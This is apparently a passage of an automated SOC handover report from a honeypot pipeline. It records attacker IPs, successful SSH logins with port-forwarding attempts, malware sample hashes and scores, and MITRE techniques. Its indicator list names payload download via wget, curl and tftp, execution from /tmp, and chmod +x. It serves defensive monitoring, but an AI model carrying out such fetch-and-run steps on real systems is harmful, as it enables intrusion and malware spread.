### 🔴 HIGH · IR-f0b2907acfa3

| Field | Detail |
|---|---|
| **Source IP** | `175.7.144[.]4` |
| **First Seen** | 2026-08-23 16:37 |
| **Last Seen** | 2026-08-23 16:37 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:37:40` | `cowrie.session.connect` |
| `2026-08-23 16:37:40` | `cowrie.client.version` |
| `2026-08-23 16:37:40` | `cowrie.client.kex` |
| `2026-08-23 16:37:43` | `cowrie.login.success` |
| `2026-08-23 16:37:44` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:37:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.7.144[.]4` to AbuseIPDB if not already reported
- [ ] Block `175.7.144[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b16ad13b3201

| Field | Detail |
|---|---|
| **Source IP** | `181.119.64[.]79` |
| **First Seen** | 2026-08-23 16:37 |
| **Last Seen** | 2026-08-23 16:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:37:49` | `cowrie.session.connect` |
| `2026-08-23 16:37:49` | `cowrie.client.version` |
| `2026-08-23 16:37:49` | `cowrie.client.kex` |
| `2026-08-23 16:37:51` | `cowrie.login.success` |
| `2026-08-23 16:37:51` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:37:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.119.64[.]79` to AbuseIPDB if not already reported
- [ ] Block `181.119.64[.]79` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e52ffb7136d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 16:46 |
| **Last Seen** | 2026-08-23 16:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:46:47` | `cowrie.session.connect` |
| `2026-08-23 16:46:47` | `cowrie.client.version` |
| `2026-08-23 16:46:48` | `cowrie.client.kex` |
| `2026-08-23 16:46:49` | `cowrie.login.success` |
| `2026-08-23 16:46:49` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:46:49` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 16:46:49` | `cowrie.direct-tcpip.data` |
| `2026-08-23 16:46:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c192d8935d18

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 16:46 |
| **Last Seen** | 2026-08-23 16:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:46:51` | `cowrie.session.connect` |
| `2026-08-23 16:46:51` | `cowrie.client.version` |
| `2026-08-23 16:46:51` | `cowrie.client.kex` |
| `2026-08-23 16:46:52` | `cowrie.login.success` |
| `2026-08-23 16:46:52` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:46:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 16:46:53` | `cowrie.direct-tcpip.data` |
| `2026-08-23 16:46:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-786c1b2f98c7

| Field | Detail |
|---|---|
| **Source IP** | `93.177.157[.]179` |
| **First Seen** | 2026-08-23 16:53 |
| **Last Seen** | 2026-08-23 16:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:53:07` | `cowrie.session.connect` |
| `2026-08-23 16:53:08` | `cowrie.client.version` |
| `2026-08-23 16:53:08` | `cowrie.client.kex` |
| `2026-08-23 16:53:09` | `cowrie.login.success` |
| `2026-08-23 16:53:09` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:53:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.177.157[.]179` to AbuseIPDB if not already reported
- [ ] Block `93.177.157[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f28dd362cb1

| Field | Detail |
|---|---|
| **Source IP** | `186.215.107[.]189` |
| **First Seen** | 2026-08-23 16:53 |
| **Last Seen** | 2026-08-23 16:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 16:53:18` | `cowrie.session.connect` |
| `2026-08-23 16:53:19` | `cowrie.client.version` |
| `2026-08-23 16:53:19` | `cowrie.client.kex` |
| `2026-08-23 16:53:21` | `cowrie.login.success` |
| `2026-08-23 16:53:21` | `cowrie.direct-tcpip.request` |
| `2026-08-23 16:53:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.215.107[.]189` to AbuseIPDB if not already reported
- [ ] Block `186.215.107[.]189` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `92.204.128[.]149` | **31** | 2026-08-23 15:14 | 2026-08-23 16:43 | 15m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **4** | 2026-08-23 15:10 | 2026-08-23 16:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]224` | **4** | 2026-08-23 15:57 | 2026-08-23 15:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]36` | **3** | 2026-08-23 15:56 | 2026-08-23 15:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]34` | **3** | 2026-08-23 15:55 | 2026-08-23 15:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]43` | **3** | 2026-08-23 15:24 | 2026-08-23 15:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `134.209.229[.]23` | **2** | 2026-08-23 16:22 | 2026-08-23 16:45 | 3m | 0 | `T1592` | 🟢 LOW |
| `104.152.52[.]133` | 1 | 2026-08-23 15:19 | 2026-08-23 15:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `151.243.11[.]231` | 1 | 2026-08-23 15:52 | 2026-08-23 15:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `156.238.86[.]2` | 1 | 2026-08-23 16:53 | 2026-08-23 16:53 | 1s | 0 | `T1592` | 🟢 LOW |
| `170.233.57[.]178` | 1 | 2026-08-23 15:15 | 2026-08-23 15:15 | 10s | 0 | `T1592` | 🟢 LOW |
| `176.170.1[.]244` | 1 | 2026-08-23 15:00 | 2026-08-23 15:00 | 9s | 0 | `T1592` | 🟢 LOW |
| `50.187.155[.]130` | 1 | 2026-08-23 16:20 | 2026-08-23 16:20 | 8s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]253` | 1 | 2026-08-23 16:02 | 2026-08-23 16:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]245` | 1 | 2026-08-23 15:38 | 2026-08-23 15:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.251.153[.]178` | 1 | 2026-08-23 16:44 | 2026-08-23 16:45 | 47s | 0 | `T1592` | 🟢 LOW |
| `85.99.103[.]38` | 1 | 2026-08-23 16:25 | 2026-08-23 16:25 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `175.7.144[.]4` | CN | CHINANET HUNAN PROVINCE NETWORK | **100** ⚠️ | 1 |
| `139.199.80[.]137` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 10 |
| `45.154.244[.]193` | FI | Shereverov Marat Ahmedovich | **100** ⚠️ | 50 |
| `80.251.153[.]178` | NL | Amarutu Technology Ltd | **100** ⚠️ | 3 |
| `218.25.233[.]22` | CN | China Unicom Liaoning province network | **100** ⚠️ | 50 |
| `66.132.224[.]224` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `61.2.228[.]177` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 10 |
| `181.119.64[.]79` | CO | UFINET COLOMBIA, S. A. | **100** ⚠️ | 5 |
| `38.199.201[.]3` | AR | ALVAREZ MILCIADE | **100** ⚠️ | 2 |
| `217.60.255[.]130` | IR | SepehrSabz IDC | **100** ⚠️ | 4 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 79 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 68 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 1 |

---

## 🔕 False Positive Summary (9 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 137 cases |
| Tool 34  | Credential Extractor        | ✅ 90 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 66 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 9 filtered (6.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 50 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 17 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 68 priority case(s) shown individually · 17 recon entry/entries in table (7 group(s) consolidating 50 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-23T18:35:01Z_
